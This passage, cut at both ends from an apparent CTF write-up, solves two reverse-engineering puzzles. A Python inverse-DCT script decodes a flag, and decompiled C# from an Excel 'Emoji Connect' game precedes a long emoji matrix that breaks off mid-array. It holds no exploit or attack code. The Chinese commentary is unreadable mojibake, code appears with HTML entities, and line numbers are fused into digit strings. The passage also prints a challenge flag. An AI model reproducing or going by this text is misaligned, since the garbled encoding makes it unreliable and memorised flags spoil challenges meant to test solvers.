-19.7624 -22.031 16.3285 2.07557 -26.2521 16.1914 18.3976 -26.9295 3.03769 41.0412 20.2598 14.991 6.99392 -22.3752 -7.24466 8.96299 -10.4874&quot;.split(&#x27; &#x27;)c = [float(k) for k in c]def idct(signal): &quot;&quot;&quot;Perform Inverse Discrete Cosine Transform (IDCT) on signal&quot;&quot;&quot; n = len(signal) x = np.zeros(n) for i in range(n): y = 0 for j in range(n): if j == 0: y += signal[j] / np.sqrt(n) else: y += signal[j] * np.sqrt(2/n) * np.cos((np.pi*(2*i+1)*j)/(2*n)) x[i] = y return np.round(x).tolist()out = idct(c)out = [int(k) for k in out]print(bytes(out))# b&#x27;flag&#123;9ab488a7-5b11-1b15-04f2-c230704ecf72&#125;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27; â€‹ Emoji Connect è¿è¿çœ‹ ä½¿ç”¨ILSpyåˆ†æGameæ¨¡å—ï¼Œå†…å«48*48 emojiè¡¨æƒ…çŸ©é˜µï¼Œå…³é”®é€»è¾‘ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445private int[] number = new int[48]&#123; 25588, 31114, 28727, 26722, 24948, 25135, 25480, 29029, 23025, 25775, 15411, 25423, 25202, 30031, 27380, 30734, 25054, 25109, 20741, 28568, 28802, 24591, 26063, 30940, 30375, 19411, 29573, 20845, 27232, 26743, 25779, 24986, 31498, 30978, 22945, 26563, 35012, 29994, 27016, 29535, 21342, 26573, 27569, 25408, 31567, 25503, 21385, 27207&#125;;private void Select_Unit(Range Target)&#123; List&lt;Range&gt; list = new List&lt;Range&gt;(); foreach (Range cell in Target.Cells) &#123; list.Add(cell); &#125; if ((Target.Cells.Count == 2 &amp;&amp; (dynamic)list[0].get_Value(Type.Missing) != null &amp;&amp; (dynamic)list[1].get_Value(Type.Missing) != null &amp;&amp; (dynamic)list[1].get_Value(Type.Missing) != &quot;\\ud83d\\udca5&quot; &amp;&amp; (dynamic)list[0].get_Value(Type.Missing) != &quot;\\ud83d\\udca5&quot;) &amp;&amp; (((dynamic)list[0].get_Value(Type.Missing) == (dynamic)list[1].get_Value(Type.Missing)) ? true : false)) &#123; int[] array = ((IEnumerable&lt;char&gt;)(string)(dynamic)list[1].get_Value(Type.Missing)).Select((Func&lt;char, int&gt;)((char c) =&gt; c)).ToArray(); int num = (array[0] - 55296) * 1024 + array[1] - 56320 + 65536 - 128512; number[num] -= (list[1].Row - 1) * (list[1].Column - 1); number[num] -= (list[0].Row - 1) * (list[0].Column - 1); Range range = list[0]; object missing = Type.Missing; object obj; list[1].set_Value(Type.Missing, obj = &quot;\\ud83d\\udca5&quot;); range.set_Value(missing, obj); &#125; check();&#125;private void check()&#123; for (int i = 0; i &lt; 48; i++) &#123; for (int j = 0; j &lt; 48; j++) &#123; if (((dynamic)sheet1.Cells[i + 1, j + 1]).Value != &quot;\\ud83d\\udca5&quot;) &#123; return; &#125; &#125; &#125; MessageBox.Show(Encoding.ASCII.GetString(number.Select((int n) =&gt; (byte)n).ToArray()));&#125; æ¯é€‰ä¸­ç›¸åŒçš„ä¸¤ä¸ªemojiï¼ŒæŒ‰ç…§emojiå¯¹åº”çš„arrayå€¼ï¼Œå°†numberæ•°ç»„é‡Œå¯¹åº”ä¸‹æ ‡çš„å€¼ï¼Œå‡å»é€‰ä¸­çš„ä¸¤ä¸ªemojiæ‰€åœ¨çš„è¡Œåˆ—å·ä¹‹ç§¯ã€‚ ä¸Šè„šæœ¬æ¨¡æ‹Ÿï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361s = [[ &quot;d83d,de08&quot;, &quot;d83d,de11&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de06&quot;, &quot;d83d,de24&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de02&quot;, &quot;d83d,de22&quot;, &quot;d83d,de10&quot;, &quot;d83d,de29&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de05&quot;, &quot;d83d,de09&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de24&quot;, &quot;d83d,de11&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de17&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de01&quot;, &quot;d83d,de11&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de20&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de00&quot;, &quot;d83d,de01&quot;, &quot;d83d,de05&quot;, &quot;d83d,de16&quot;, &quot;d83d,de11&quot;, &quot;d83d,de21&quot;, &quot;d83d,de12&quot;, &quot;d83d,de07&quot;, &quot;d83d,de04&quot;, &quot;d83d,de1b&quot; ], [ &quot;d83d,de0a&quot;, &quot;d83d,de08&quot;, &quot;d83d,de02&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de29&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de08&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de05&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de12&quot;, &quot;d83d,de26&quot;, &quot;d83d,de11&quot;, &quot;d83d,de05&quot;, &quot;d83d,de19&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de29&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de10&quot;, &quot;d83d,de11&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de14&quot;, &quot;d83d,de25&quot;, &quot;d83d,de27&quot;, &quot;d83d,de16&quot;, &quot;d83d,de07&quot;, &quot;d83d,de26&quot;, &quot;d83d,de09&quot;, &quot;d83d,de08&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de23&quot;, &quot;d83d,de09&quot;, &quot;d83d,de13&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de03&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de28&quot;, &quot;d83d,de16&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de19&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de23&quot; ], [ &quot;d83d,de1c&quot;, &quot;d83d,de09&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de12&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de02&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de03&quot;, &quot;d83d,de04&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de24&quot;, &quot;d83d,de11&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de17&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de21&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de28&quot;, &quot;d83d,de09&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de28&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de00&quot;, &quot;d83d,de21&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de05&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de14&quot;, &quot;d83d,de28&quot;, &quot;d83d,de17&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de08&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de24&quot; ], [ &quot;d83d,de0d&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de05&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de17&quot;, &quot;d83d,de22&quot;, &quot;d83d,de07&quot;, &quot;d83d,de03&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de03&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de22&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de22&quot;, &quot;d83d,de22&quot;, &quot;d83d,de14&quot;, &quot;d83d,de27&quot;, &quot;d83d,de25&quot;, &quot;d83d,de22&quot;, &quot;d83d,de01&quot;, &quot;d83d,de20&quot;, &quot;d83d,de00&quot;, &quot;d83d,de19&quot;, &quot;d83d,de05&quot;, &quot;d83d,de11&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de11&quot;, &quot;d83d,de21&quot;, &quot;d83d,de14&quot;, &quot;d83d,de18&quot;, &quot;d83d,de19&quot;, &quot;d83d,de02&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de1e&quot; ], [ &quot;d83d,de13&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de11&quot;, &quot;d83d,de07&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de15&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de09&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de26&quot;, &quot;d83d,de29&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de25&quot;, &quot;d83d,de17&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de00&quot;, &quot;d83d,de09&quot;, &quot;d83d,de07&quot;, &quot;d83d,de27&quot;, &quot;d83d,de05&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de16&quot;, &quot;d83d,de11&quot;, &quot;d83d,de05&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de04&quot;, &quot;d83d,de05&quot;, &quot;d83d,de03&quot;, &quot;d83d,de24&quot;, &quot;d83d,de12&quot;, &quot;d83d,de09&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de05&quot;, &quot;d83d,de04&quot; ], [ &quot;d83d,de0e&quot;, &quot;d83d,de06&quot;, &quot;d83d,de01&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de20&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de09&quot;, &quot;d83d,de10&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de10&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de25&quot;, &quot;d83d,de22&quot;, &quot;d83d,de02&quot;, &quot;d83d,de08&quot;, &quot;d83d,de14&quot;, &quot;d83d,de14&quot;, &quot;d83d,de06&quot;, &quot;d83d,de23&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de02&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de10&quot;, &quot;d83d,de20&quot;, &quot;d83d,de07&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de17&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de07&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de28&quot; ], [ &quot;d83d,de27&quot;, &quot;d83d,de03&quot;, &quot;d83d,de29&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de04&quot;, &quot;d83d,de08&quot;, &quot;d83d,de15&quot;, &quot;d83d,de02&quot;, &quot;d83d,de21&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de21&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de06&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de15&quot;, &quot;d83d,de28&quot;, &quot;d83d,de28&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de22&quot;, &quot;d83d,de26&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de27&quot;, &quot;d83d,de17&quot;, &quot;d83d,de07&quot;, &quot;d83d,de05&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de16&quot;, &quot;d83d,de22&quot;, &quot;d83d,de18&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de26&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de12&quot;, &quot;d83d,de26&quot;, &quot;d83d,de21&quot;, &quot;d83d,de2b&quot; ], [ &quot;d83d,de2a&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de09&quot;, &quot;d83d,de16&quot;, &quot;d83d,de06&quot;, &quot;d83d,de02&quot;, &quot;d83d,de25&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de01&quot;, &quot;d83d,de02&quot;, &quot;d83d,de29&quot;, &quot;d83d,de09&quot;, &quot;d83d,de01&quot;, &quot;d83d,de00&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de13&quot;, &quot;d83d,de08&quot;, &quot;d83d,de04&quot;, &quot;d83d,de24&quot;, &quot;d83d,de15&quot;, &quot;d83d,de19&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de06&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de16&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de19&quot;, &quot;d83d,de03&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de19&quot;, &quot;d83d,de20&quot;, &quot;d83d,de10&quot;, &quot;d83d,de17&quot;, &quot;d83d,de06&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de22&quot;, &quot;d83d,de10&quot; ], [ &quot;d83d,de1e&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de10&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de07&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de24&quot;, &quot;d83d,de09&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de09&quot;, &quot;d83d,de12&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de04&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de10&quot;, &quot;d83d,de08&quot;, &quot;d83d,de03&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de25&quot;, &quot;d83d,de23&quot;, &quot;d83d,de27&quot;, &quot;d83d,de12&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de27&quot;, &quot;d83d,de11&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de21&quot;, &quot;d83d,de20&quot;, &quot;d83d,de05&quot;, &quot;d83d,de01&quot;, &quot;d83d,de18&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de01&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de11&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de13&quot;, &quot;d83d,de28&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de09&quot;, &quot;d83d,de2d&quot; ], [ &quot;d83d,de09&quot;, &quot;d83d,de26&quot;, &quot;d83d,de29&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de06&quot;, &quot;d83d,de06&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de09&quot;, &quot;d83d,de12&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de02&quot;, &quot;d83d,de28&quot;, &quot;d83d,de05&quot;, &quot;d83d,de28&quot;, &quot;d83d,de00&quot;, &quot;d83d,de18&quot;, &quot;d83d,de21&quot;, &quot;d83d,de23&quot;, &quot;d83d,de07&quot;, &quot;d83d,de20&quot;, &quot;d83d,de02&quot;, &quot;d83d,de23&quot;, &quot;d83d,de18&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de29&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de28&quot;, &quot;d83d,de12&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de23&quot;, &quot;d83d,de00&quot;, &quot;d83d,de09&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de25&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de20&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de2e&quot; ], [ &quot;d83d,de06&quot;, &quot;d83d,de12&quot;, &quot;d83d,de28&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de22&quot;, &quot;d83d,de09&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de28&quot;, &quot;d83d,de29&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de29&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de23&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de03&quot;, &quot;d83d,de01&quot;, &quot;d83d,de16&quot;, &quot;d83d,de10&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de06&quot;, &quot;d83d,de29&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de25&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de12&quot;, &quot;d83d,de10&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de08&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de02&quot;, &quot;d83d,de19&quot;, &quot;d83d,de20&quot;, &quot;d83d,de23&quot;, &quot;d83d,de14&quot;, &quot;d83d,de02&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de1a&quot; ], [ &quot;d83d,de00&quot;, &quot;d83d,de28&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de14&quot;, &quot;d83d,de18&quot;, &quot;d83d,de19&quot;, &quot;d83d,de16&quot;, &quot;d83d,de21&quot;, &quot;d83d,de09&quot;, &quot;d83d,de08&quot;, &quot;d83d,de20&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de00&quot;, &quot;d83d,de03&quot;, &quot;d83d,de19&quot;, &quot;d83d,de28&quot;, &quot;d83d,de12&quot;, &quot;d83d,de15&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de21&quot;, &quot;d83d,de11&quot;, &quot;d83d,de07&quot;, &quot;d83d,de23&quot;, &quot;d83d,de22&quot;, &quot;d83d,de07&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de21&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de21&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de04&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de00&quot;, &quot;d83d,de00&quot;, &quot;d83d,de1e&quot; ], [ &quot;d83d,de23&quot;, &quot;d83d,de15&quot;, &quot;d83d,de15&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de05&quot;, &quot;d83d,de06&quot;, &quot;d83d,de06&quot;, &quot;d83d,de18&quot;, &quot;d83d,de08&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de06&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de14&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de21&quot;, &quot;d83d,de07&quot;, &quot;d83d,de28&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de23&quot;, &quot;d83d,de00&quot;, &quot;d83d,de10&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de17&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de29&quot;, &quot;d83d,de25&quot;, &quot;d83d,de24&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de24&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de25&quot; ], [ &quot;d83d,de14&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de28&quot;, &quot;d83d,de15&quot;, &quot;d83d,de08&quot;, &quot;d83d,de09&quot;, &quot;d83d,de16&quot;, &quot;d83d,de28&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de12&quot;, &quot;d83d,de16&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de23&quot;, &quot;d83d,de01&quot;, &quot;d83d,de28&quot;, &quot;d83d,de24&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de01&quot;, &quot;d83d,de22&quot;, &quot;d83d,de21&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de19&quot;, &quot;d83d,de05&quot;, &quot;d83d,de29&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de07&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de07&quot;, &quot;d83d,de13&quot;, &quot;d83d,de10&quot;, &quot;d83d,de02&quot;, &quot;d83d,de01&quot;, &quot;d83d,de01&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de24&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de29&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de14&quot; ], [ &quot;d83d,de28&quot;, &quot;d83d,de08&quot;, &quot;d83d,de22&quot;, &quot;d83d,de06&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de10&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de03&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de04&quot;, &quot;d83d,de02&quot;, &quot;d83d,de11&quot;, &quot;d83d,de06&quot;, &quot;d83d,de19&quot;, &quot;d83d,de14&quot;, &quot;d83d,de19&quot;, &quot;d83d,de00&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de28&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de23&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de05&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de07&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de29&quot;, &quot;d83d,de29&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de08&quot; ], [ &quot;d83d,de29&quot;, &quot;d83d,de08&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de29&quot;, &quot;d83d,de22&quot;, &quot;d83d,de18&quot;, &quot;d83d,de26&quot;, &quot;d83d,de29&quot;, &quot;d83d,de05&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de03&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de06&quot;, &quot;d83d,de02&quot;, &quot;d83d,de20&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de00&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de07&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de21&quot;, &quot;d83d,de29&quot;, &quot;d83d,de26&quot;, &quot;d83d,de05&quot;, &quot;d83d,de12&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de00&quot;, &quot;d83d,de01&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0f&quot; ], [ &quot;d83d,de03&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de13&quot;, &quot;d83d,de02&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de16&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de29&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de14&quot;, &quot;d83d,de11&quot;, &quot;d83d,de10&quot;, &quot;d83d,de15&quot;, &quot;d83d,de03&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de28&quot;, &quot;d83d,de15&quot;, &quot;d83d,de17&quot;, &quot;d83d,de07&quot;, &quot;d83d,de21&quot;, &quot;d83d,de05&quot;, &quot;d83d,de16&quot;, &quot;d83d,de03&quot;, &quot;d83d,de26&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de19&quot;, &quot;d83d,de01&quot;, &quot;d83d,de09&quot;, &quot;d83d,de02&quot;, &quot;d83d,de14&quot;, &quot;d83d,de13&quot;, &quot;d83d,de29&quot; ], [ &quot;d83d,de1c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de10&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de09&quot;, &quot;d83d,de18&quot;, &quot;d83d,de00&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de17&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de22&quot;, &quot;d83d,de1b&quot;, 